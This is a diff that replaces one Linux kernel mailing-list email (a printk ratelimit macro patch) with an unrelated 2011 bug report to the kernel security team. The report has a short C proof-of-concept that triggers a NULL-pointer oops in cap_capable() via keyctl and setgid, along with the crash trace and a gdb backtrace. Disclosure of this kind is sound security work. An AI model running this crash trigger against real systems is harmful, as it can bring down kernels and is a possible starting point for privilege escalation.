@@ -1,86 +1,129 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S932806Ab1EXTto (ORCPT <rfc822;w@1wt.eu>);
-	Tue, 24 May 2011 15:49:44 -0400
-Received: from mail.perches.com ([173.55.12.10]:1977 "EHLO mail.perches.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S932249Ab1EXTtl (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 24 May 2011 15:49:41 -0400
-Subject: Re: linux-next: Tree for May 24 (ratelimits, CONFIG_PRINTK not
- enabled)
-From: Joe Perches <joe@perches.com>
-To: David Miller <davem@davemloft.net>
-Cc: randy.dunlap@oracle.com, sfr@canb.auug.org.au, netdev@vger.kernel.org,
-        linux-next@vger.kernel.org, linux-kernel@vger.kernel.org
-In-Reply-To: <20110524.153222.1953796640575918161.davem@davemloft.net>
-References: <20110524140212.a4f19769.sfr@canb.auug.org.au>
-	 <20110524113328.e3d5867b.randy.dunlap@oracle.com>
-	 <1306262988.2298.49.camel@Joe-Laptop>
-	 <20110524.153222.1953796640575918161.davem@davemloft.net>
-Content-Type: text/plain; charset="UTF-8"
-Date: Tue, 24 May 2011 12:49:40 -0700
-Message-ID: <1306266580.2298.55.camel@Joe-Laptop>
-Mime-Version: 1.0
-X-Mailer: Evolution 2.32.2 
-Content-Transfer-Encoding: 7bit
+	id S932842Ab1EXTwe (ORCPT <rfc822;w@1wt.eu>);
+	Tue, 24 May 2011 15:52:34 -0400
+Received: from mail-gx0-f174.google.com ([209.85.161.174]:42843 "EHLO
+	mail-gx0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751057Ab1EXTwd convert rfc822-to-8bit (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Tue, 24 May 2011 15:52:33 -0400
+MIME-Version: 1.0
+In-Reply-To: <BANLkTi=-xRRxi4CtxMLt0VgTJWSdiVQugw@mail.gmail.com>
+References: <BANLkTikfqV57AtCckh99jAT2O38mM6MzTA@mail.gmail.com>
+	<BANLkTikey3L4doiHY=__=690TZNsXqRHUQ@mail.gmail.com>
+	<alpine.DEB.2.00.1105231133580.29047@router.home>
+	<BANLkTi=-xRRxi4CtxMLt0VgTJWSdiVQugw@mail.gmail.com>
+Date: Tue, 24 May 2011 21:52:32 +0200
+Message-ID: <BANLkTin1zhuA3z61cBWwJws+P1-xA5bGZA@mail.gmail.com>
+Subject: Re: Fwd: Oops (bad memory deref) in slab_alloc() due to filp_cachep
+ holding incorrect values
+From: =?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?= <robert@swiecki.net>
+To: linux-kernel@vger.kernel.org
+Cc: security@kernel.org, kees@ubuntu.com, Tavis Ormandy <taviso@cmpxchg8b.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8BIT
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Tue, 2011-05-24 at 15:32 -0400, David Miller wrote:
-> From: Joe Perches <joe@perches.com>
-> Date: Tue, 24 May 2011 11:49:48 -0700
-> > On Tue, 2011-05-24 at 11:33 -0700, Randy Dunlap wrote:
-> >> Adding <linux/ratelimit.h> to <asm-generic/bug.h> causes other problems:
-> > Yup, that's not a good solution.
-> Please come up with a fix or I'll have to revert, thanks Joe.
+And the repro - I think this might be exploitable (user-space NULL ptr
+deref at the first glance, in cap_capable() while in sys_setgid()).
+Works for me with 2.6.39 and the following config:
+http://alt.swiecki.net/linux_kernel/ise-test-2.6.39-kernel-config.txt
 
-I have some errands to run for awhile.
+It works for me with apparmor loaded, but looking at the code it
+should work with SELinux as well (both call cap_capable()). Could be
+some regression of http://securitytracker.com/id?1024384
 
-Probably a revert today and another patch set tomorrow
-might be best.
+It works with 2.6.39 but not with 2.6.39-rc4. Found with Tavis
+Ormandy's http://code.google.com/p/iknowthis/
 
-This seems to work and doesn't cause any extra state to be
-instantiated when !CONFIG_PRINTK.  What do you think?
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/keyctl.h>
+#include <linux/sched.h>
 
-#ifdef CONFIG_PRINTK
+int TH1(void *dummy) {
+	syscall(__NR_keyctl, KEYCTL_SESSION_TO_PARENT);
+	syscall(__NR_exit, 0);
+}
 
-#define WARN_ON_RATELIMIT(condition, state)			\
-	WARN_ON((condition) && __ratelimit(state))
+int main(int argc, char **argv)
+{
+	char stack[1024 * 32];
+	pid_t pid = clone(TH1, stack + sizeof(stack), CLONE_VM, NULL);
+	if (pid == -1) {
+		perror("clone");
+		return -1;
+	}
+	int status;
+	while(waitpid(pid, &status, __WALL) != pid);
+	setgid(4286409707);
+	return 0;
+}
 
-#define __WARN_RATELIMIT(condition, state, format...)		\
-({								\
-	int rtn = 0;						\
-	if (unlikely(__ratelimit(state)))			\
-		rtn = WARN(condition, format);			\
-	rtn;							\
-})
+Oops (stacktraces from the previous emails are also valid). Basically
+'struct user_namespace *targ_ns' in cap_capable() is NULL.
 
-#define WARN_RATELIMIT(condition, format...)			\
-({								\
-	static DEFINE_RATELIMIT_STATE(_rs,			\
-				      DEFAULT_RATELIMIT_INTERVAL,	\
-				      DEFAULT_RATELIMIT_BURST);	\
-	__WARN_RATELIMIT(condition, &_rs, format);		\
-})
+[  288.431402] CPU 0
+[  288.431402] Pid: 875, comm: apparmor Not tainted 2.6.39 #1 Dell
+Inc.                 Precision WorkStation 390    /0GH911
+[  288.431402] RIP: 0010:[<ffffffff8134cbdf>]  [<ffffffff8134cbdf>]
+cap_capable+0x18/0x67
+[  288.431402] RSP: 0018:ffff880120d43ec8  EFLAGS: 00010203
+[  288.431402] RAX: ffff8801220ee0c0 RBX: 0000000000000001 RCX: 0000000000000006
+[  288.431402] RDX: 0000000000000000 RSI: ffff880120ebb600 RDI: 0000000000000006
+[  288.431402] RBP: ffff880120d43ec8 R08: 0000000000000001 R09: 000000000000005a
+[  288.431402] R10: ffffffff813d42ea R11: 0000000000000246 R12: ffff880120ebb600
+[  288.431402] R13: 0000000000000006 R14: ffff8801205aaee0 R15: 0000000000000000
+[  288.431402] FS:  00007f919efc2720(0000) GS:ffff88012bc00000(0000)
+knlGS:0000000000000000
+[  288.431402] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
+[  288.431402] CR2: 0000000000000408 CR3: 00000001205de000 CR4: 00000000000006f0
+[  288.431402] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  288.431402] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
+[  288.431402] Process apparmor (pid: 875, threadinfo
+ffff880120d42000, task ffff8801205aaee0)
+[  288.431402] Stack:
+[  288.431402]  ffff880120d43f08 ffffffff81378bfb ffff880120d43ee8
+ffff8801205aaee0
+[  288.431402]  00000000ff7d6beb ffff880120ebb600 0000000000000000
+0000000000000000
+[  288.431402]  ffff880120d43f18 ffffffff8134d932 ffff880120d43f38
+ffffffff8109d99d
+[  288.431402] Call Trace:
+[  288.431402]  [<ffffffff81378bfb>] apparmor_capable+0x27/0x61
+[  288.431402]  [<ffffffff8134d932>] security_capable+0x2a/0x2c
+[  288.431402]  [<ffffffff8109d99d>] ns_capable+0x3a/0x4f
+[  288.431402]  [<ffffffff8109da2b>] nsown_capable+0x24/0x29
+[  288.431402]  [<ffffffff810a6695>] sys_setgid+0x43/0x8d
+[  288.431402]  [<ffffffff81ed4902>] system_call_fastpath+0x16/0x1b
+[  288.431402] Code: c1 fe 05 d3 e0 48 63 f6 23 44 b2 38 c9 83 f8 01
+19 c0 c3 55 48 89 e5 0f 1f 44 00 00 89 cf 48 81 fa f0 16 a2 82 74 0d
+48 8b 46 70
+[  288.431402]  39 82 08 04 00 00 74 3d 48 8b 46 70 48 3b 50 60 75 1d 89 f9
+[  288.431402] RIP  [<ffffffff8134cbdf>] cap_capable+0x18/0x67
+[  288.431402]  RSP <ffff880120d43ec8>
+[  288.431402] CR2: 0000000000000408
 
-#else
+(gdb) bt
+#0  0xffffffff8134cbdf in cap_capable (tsk=<value optimized out>,
+cred=0x0, targ_ns=0x0, cap=6, audit=1) at security/commoncap.c:88
+#1  0xffffffff81378bfb in apparmor_capable (task=0xffff880120e3aee0,
+cred=0xffff88011f540500, ns=<value optimized out>, cap=6, audit=1) at
+security/apparmor/lsm.c:144
+#2  0xffffffff8134d932 in security_capable (ns=<value optimized out>,
+cred=<value optimized out>, cap=<value optimized out>) at
+security/security.c:160
+#3  0xffffffff8109d99d in ns_capable (ns=<value optimized out>,
+cap=<value optimized out>) at kernel/capability.c:381
+#4  0xffffffff8109da2b in nsown_capable (cap=<value optimized out>) at
+kernel/capability.c:412
+#5  0xffffffff810a6695 in sys_setgid (gid=1540) at kernel/sys.c:570
+#6  0xffffffff810c1e11 in sys_setgid16 (gid=<value optimized out>) at
+kernel/uid16.c:53
 
-#define WARN_ON_RATELIMIT(condition, state)			\
-	WARN_ON(condition)
-
-#define __WARN_RATELIMIT(condition, state, format...)		\
-({								\
-	int rtn = WARN(condition, format);			\
-	rtn;							\
-})
-
-#define WARN_RATELIMIT(condition, format...)			\
-({								\
-	int rtn = WARN(condition, format);			\
-	rtn;							\
-})
-
-#endif
-
-
+-- 
+Robert Święcki
